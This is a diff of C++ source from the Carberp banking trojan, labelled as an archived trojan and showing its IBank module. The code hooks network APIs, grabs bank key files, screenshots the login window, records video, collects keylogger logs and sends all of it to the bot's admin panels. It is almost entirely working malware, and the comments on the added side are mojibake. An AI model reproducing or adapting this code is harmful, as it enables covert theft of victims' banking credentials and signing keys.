@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -39,7 +50,7 @@ namespace IBANKDEBUGSTRINGS
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define IBDBG IBANKDEBUGSTRINGS::DBGOutMessage<>
 //---------------------------------------------------------------------------
 
@@ -59,26 +70,26 @@ namespace IBank
 	//-----------------------------------------------------------------------
 	typedef struct TIBankLog
 	{
-		DWORD     PID;              // Идентификатор проуесса
-		HWND      Wnd;              // Главное окно системы
-		PCHAR     SystemName;       // Имя системы
-		PCHAR     KeyFile;          // Имя файла ключа
-        PCHAR     Log;              // Текстовый лог
-		TMemBlock StartScreenShot;  // Скриншот созданный при старте системы
-		TMemBlock EndScreenShot;    // Скриншот созданный при закрытии системы
-		PCHAR     LogFile;          // Имя файла лога
+		DWORD     PID;              // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		HWND      Wnd;              // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		PCHAR     SystemName;       // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		PCHAR     KeyFile;          // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+        PCHAR     Log;              // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+		TMemBlock StartScreenShot;  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		TMemBlock EndScreenShot;    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		PCHAR     LogFile;          // пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	} *PIBankLog;
 
 	//-----------------------------------------------------------------------
 
-	// Определяем типы для установки хуков
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	typedef int (WINAPI *TConnect)(SOCKET s, const struct sockaddr *name, int namelen);
 
 
 	TConnect Real_Connect;
 
 
-	// Глобальные переменные системы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD         ProcessID = 0;
 	PKeyLogSystem System    = NULL;
 	bool          Hooked    = false;  
@@ -94,7 +105,7 @@ namespace IBank
 	TIBankLog Log;
 
 	DWORD KeyFileNameHash = 0;
-	bool recVideoIsRun = false; //запущен ли процесс записи видео
+	bool recVideoIsRun = false; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	//-----------------------------------------------------------------------
 
@@ -102,7 +113,7 @@ namespace IBank
 
 	//-----------------------------------------------------------------------
 
-	//создает имя файла которое будет одинаковым для всех процессов, в имени файла  используется пид процесса, для которого он предназначен
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR GetNameForKeyFile()
 	{
 		PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
@@ -112,11 +123,11 @@ namespace IBank
 			char buf[32];
 			fwsprintfA pwsprintfA = Get_wsprintfA();
 
-			// Для идентификации используем глобальный пид процесса
+			// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			pwsprintfA( buf, "pid_%d", ProcessID);
 			pPathAppendA( path, buf );
 			char* path2 = UIDCrypt::CryptFileName( path, true );
-			IBDBG( "IBANK", "Файл ключа: %s -> %s", path, path2 );
+			IBDBG( "IBANK", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s -> %s", path, path2 );
 			HEAP::Free(path);
 			path = path2;
 		}
@@ -125,18 +136,18 @@ namespace IBank
 
 	void SetKeyFile(PWCHAR FileName)
 	{
-		// Устанавливаем файл ключа
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (Log.KeyFile != NULL)
 			STR::Free2(Log.KeyFile);
 
 		KeyFileNameHash = CalcHashW(FileName);
 		Log.KeyFile = WSTR::ToAnsi(FileName, 0);
-		IBDBG("IBank", "Обнаружен файл ключа %s", Log.KeyFile);
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", Log.KeyFile);
     }
 
 	//-----------------------------------------------------------------------
 
-	//true - если файл является файлом ключем, а также отсылает его в админку
+	//true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int IsFileKeyJava( FileGrabber::ParamEvent* e )
 	{
 		if( e->unicode )
@@ -148,12 +159,12 @@ namespace IBank
 	{
 		if( e->unicode )
 		{
-			//сохраняем имя файла в специальном файле
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			char* nameFile = GetNameForKeyFile();
 			int len = m_wcslen(e->fileNameW);
-			File::WriteBufferA( nameFile, (LPVOID)e->fileNameW, (len + 1) * sizeof(WCHAR) ); //сохраняем вместе с завершающим нулем
+			File::WriteBufferA( nameFile, (LPVOID)e->fileNameW, (len + 1) * sizeof(WCHAR) ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			STR::Free(nameFile);
-			IBDBG("IBankW", "Обнаружен файл ключа %ls", e->fileNameW);
+			IBDBG("IBankW", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %ls", e->fileNameW);
 		}
 		return 0;
 	}
@@ -166,14 +177,14 @@ namespace IBank
 		struct hostent FAR * Res = Real_gethostbyname(name);
 
 
-        // IBDBG("IBankW", "============ хост %s", name);
+        // IBDBG("IBankW", "============ пїЅпїЅпїЅпїЅ %s", name);
 
-		// В случае если получается имя хоста ибанка, сохраняем его
-		// для дальнейших проверок
+		// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Res && !IsAzHost(name) && !IsMainHost(name))
 		{
 			IBnakHostAddr = *(LPDWORD)Res->h_addr_list[0];
-			IBDBG("IBankW", ">>>>>>> Отреагировали на хост %s", name);
+			IBDBG("IBankW", ">>>>>>> пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ %s", name);
         }
 
 		return Res;
@@ -183,7 +194,7 @@ namespace IBank
 
 	int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
 	{
-		// Идёт запрос на сервер, закрываем систему.
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		#ifndef JAVS_PATCHERH
 			KeyLogger::CloseSession();
         #else
@@ -200,19 +211,19 @@ namespace IBank
 
 	void MakeScreenShot()
 	{
-    	IBDBG("IBank", "Делаем снимок экрана");
+    	IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 		ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, (LPBYTE &)Log.StartScreenShot.Data, Log.StartScreenShot.Size);
 	}
 	//-----------------------------------------------------------------------
 
 	void SetHooks()
 	{
-		// Устанавливаем треуемые хуки
-		IBDBG( "IBank", "Ставим хуки для %s", System->Name );
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		IBDBG( "IBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ %s", System->Name );
 
 
-		// Ставим хук на подключение к серверу, для определения момента закрыти
-		// системы
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		const DWORD HASH_connect = 0xEDD8FE8A /* connect */;
 		if ( HookApi( DLL_WINSOCK, HASH_connect, &Hook_Connect ) )
 		{
@@ -233,7 +244,7 @@ namespace IBank
 
 	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
 	{
-		IBDBG("IBank", "Добавлен файл граббер");
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		FileGrabber::Init(FileGrabber::CREATEFILEW);
 		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
 		rv->FuncReceiver = IsFileKey;
@@ -241,7 +252,7 @@ namespace IBank
 		rv->maxSize = 3000;
 		rv->aw |= FileGrabber::FILEISBIN;
 		const char pkFormat[] = { 'P', 'K', 0 };
-		FileGrabber::AddIgnoreBeg( rv, pkFormat ); //игнорируем zip (jar) архив
+		FileGrabber::AddIgnoreBeg( rv, pkFormat ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ zip (jar) пїЅпїЅпїЅпїЅпїЅ
 		FileGrabber::AddReceiver(rv);
 	}
 
@@ -259,29 +270,29 @@ namespace IBank
 	void SystemActivated(LPVOID Sender)
 	{
 		System = (PKeyLogSystem)Sender;
-		IBDBG("IBank", "Система IBANK активирована");
-		// Активированы система IBank
-		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ IBANK пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ IBank
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, %08x", System->Name, (DWORD)GetImageBase() );
     
 
-		// Сигнализируем ява патчеру о необходимости запуска патчей
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		#ifdef JAVS_PATCHERH
 			if (!IsPSBSystem())
 				StartThread( JavaPatcherSignal, 0 );
 		#endif
 
-		// Запускаем запись видео
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		//VideoRecorderSrv::StartRecording(SystemName);
-		IBDBG("IBank", "Запускаем запись видео");
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 		VideoProcess::RecordPID( 0, SystemName );
 
-		// Инициализируем данные системы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
 
 		Log.PID     = Logger->PID;
 		Log.LogFile = STR::New(Logger->FileName);
 
-		// Определяем основное окно
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		Log.Wnd = Logger->ActiveWND;
 		HWND Temp = Log.Wnd;
 		while (Temp != NULL)
@@ -291,7 +302,7 @@ namespace IBank
             	Log.Wnd = Temp;
 		}
 
-		//  Ставим хуки
+		//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if( !Hooked ) 
 		{
 			SetHooks();
@@ -304,7 +315,7 @@ namespace IBank
 
 	void SystemActivated2(LPVOID Sender)
 	{
-		IBDBG("IBank", "граббер для оффлайн версии активирован");
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		AddFileGrabber(IsFileKeyJavaW);
 	}
 
@@ -321,16 +332,16 @@ namespace IBank
 		if (System == NULL)
 			return;
 
-		IBDBG("IBank", "Система %s закрыта", System->Name);
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s пїЅпїЅпїЅпїЅпїЅпїЅпїЅ", System->Name);
 		FileGrabber::Release();
 		KeyLogger::DisconnectEventHandler(KLE_AFTER_SHOW_WND, IBankShowWindow );
 
-		//читаем имя файла ключа записанного в другом процессе
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		char* nameFile = GetNameForKeyFile();
 		if( nameFile )
 		{
 			DWORD sz;
-			//считываем имя файла ключа
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			PWCHAR fileKey = (PWCHAR)File::ReadToBufferA( nameFile, sz );
 			if( fileKey )
 			{
@@ -342,15 +353,15 @@ namespace IBank
 			}
 		}
 
-		// Создаём скриншот окна авторизации
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		ScreenShot::MakeToMem(Log.Wnd, 0, 0, 0, 0, NULL, (LPBYTE &)Log.EndScreenShot.Data, Log.EndScreenShot.Size);
 
 		System = NULL;
 
-		// Отправляем лог
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
         SendIBankLog();
 
-		// Освобождаем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		STR::Free2(Log.LogFile);
 
 		if (Log.EndScreenShot.Data != NULL)
@@ -361,7 +372,7 @@ namespace IBank
 		
 		if( nameFile )
 		{
-			pDeleteFileA(nameFile); //удаляем файл с именем ключа
+			pDeleteFileA(nameFile); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			STR::Free(nameFile);
 		}
 	}
@@ -369,20 +380,20 @@ namespace IBank
 	void SystemDeactivated2(LPVOID Sender)
 	{
 		FileGrabber::Release();
-		IBDBG("IBankW", "Закрыт" );
+		IBDBG("IBankW", "пїЅпїЅпїЅпїЅпїЅпїЅ" );
 	}
 
 	//-----------------------------------------------------------------------
 
 	bool SendLog(PCHAR URL, PIBankLog Log)
 	{
-		// Отправляем лог системы
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (STR::IsEmpty(URL) || Log == NULL)
 			return false;
 
         PCHAR UID = GenerateBotID();
 
-		// Заполняем массив данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PMultiPartData Data = MultiPartData::Create();
 
 
@@ -420,7 +431,7 @@ namespace IBank
 			MultiPartData::AddBlobAsFile(Data, "procscreen", "SS_2.png", NULL, (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
 		}
 
-        // Записываем признак установленного явапатча
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		#ifdef JavaClient2015SaverH
 			PCHAR PatchInstalled = (JavaPatchInstalled()) ? "1" : "0";
 		#else
@@ -429,7 +440,7 @@ namespace IBank
 		MultiPartData::AddStringField(Data, "patchsetuped",  PatchInstalled);
 
 
-		// Отправляем запрос
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 		THTTPResponseRec Response;
     	ClearStruct(Response);
@@ -443,7 +454,7 @@ namespace IBank
 		if (Result)
 			Result = CheckValidPostResult(&Response, NULL);
 
-		// Освобождаем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		MultiPartData::Free(Data);
 		STR::Free(UID);
 		HTTPResponse::Clear(&Response);
@@ -456,9 +467,9 @@ namespace IBank
 
 	BOOL SendLogToAdmin(PIBankLog L)
 	{
-		// Функция отправляет данные на необъодимую админку
-		// UseMainHosts - Указание отправлять лог на основную админку
-		IBDBG("IBank", "Отправляем лог на основную админку бота");
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		// UseMainHosts - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 		BOOL Result = FALSE;
 		PCHAR URL = GetBotScriptURL(SCRIPT_IBANK_LOG);
 
@@ -467,19 +478,19 @@ namespace IBank
 			Result = SendLog(URL, L);
 			STR::Free(URL);
 		}
-		IBDBG("IBank", "Отправляем лог. [Result=%d] [URL=%s]", Result, URL);
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ. [Result=%d] [URL=%s]", Result, URL);
 		return Result;
 	}
 	//-----------------------------------------------------------------------
 	#ifdef AzConfigH
 	BOOL SendLogToAZAdmin(PIBankLog L)
 	{
-		// Функция отправляет лог в админку аз
-		IBDBG("IBank", "Отправляем лог на основную админку бота");
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
 		string URL = GetAzGrabberURL(SystemName);
 		if (URL.IsEmpty()) return FALSE;
 
-		// Формируем отправляемые данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		TMultiPartData Data;
 		Data.Add("txt[log]",  L->Log);
 		Data.AddFile("file[Key]", L->KeyFile, NULL, NULL);
@@ -492,7 +503,7 @@ namespace IBank
 		string Doc;
 		if (H.Post(URL.t_str(), &Data, Doc))
 			Result = H.Response.Code == 403;
-		IBDBG("IBank", "Отправляем лог в админку АЗ. [Result=%d]", Result);
+		IBDBG("IBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ. [Result=%d]", Result);
 		return Result;
 	}
 	#endif
@@ -501,7 +512,7 @@ namespace IBank
 
 	DWORD WINAPI SenderProc(LPVOID Data)
 	{
-		// Отправляем отчёт
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 		PIBankLog L = (PIBankLog)Data;
 		if (!L)
@@ -511,13 +522,13 @@ namespace IBank
 		BOOL Sended2 = FALSE;
 		for (int i=1; i<=10; i++)
 		{
-			// Отправляем лог на основную админку бота
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if (!Sended1)
 				Sended1 = SendLogToAdmin(L);
 
 			#ifdef AzConfigH
-				// Если включен модуль ява хостов то, отправляем
-				// лог и на эту админку.
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅ пїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				if (!Sended2)
 					Sended2 = SendLogToAZAdmin(L);
 			#else
@@ -526,11 +537,11 @@ namespace IBank
 
 			if (Sended1 && Sended2) break;
 
-			// Приостанавливаем поток
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			pSleep(5000 * i);
 		}
 
-		// Уничтожаем данные  
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ  
 		MemFree(L->EndScreenShot.Data);
 		STR::Free(L->LogFile);
 		STR::Free(L->Log);
@@ -546,21 +557,21 @@ namespace IBank
 
 	void SendIBankLog()
 	{
-		// Запускаем отправку данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PIBankLog L = CreateStruct(TIBankLog);
 
-		// Копируем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		m_memcpy(L, &Log, sizeof(Log));
 
 
 		L->Log = KLGPacker::GetTextDataFromFile(Log.LogFile);
 
 
-		// Очищаем данные, которые относятся к рамкам текущей сессии
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Log.LogFile = NULL;
 		ClearStruct(Log.EndScreenShot);
 
-		// Запускаем поток
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		StartThread(SenderProc, L);
     }
 
@@ -568,7 +579,7 @@ namespace IBank
 
 BOOL WINAPI Hook_WriteFile( HANDLE hFile, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped )
 {
-	if( SExpWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite ) ) //данные переданы на анализ, говорим что запись успешна
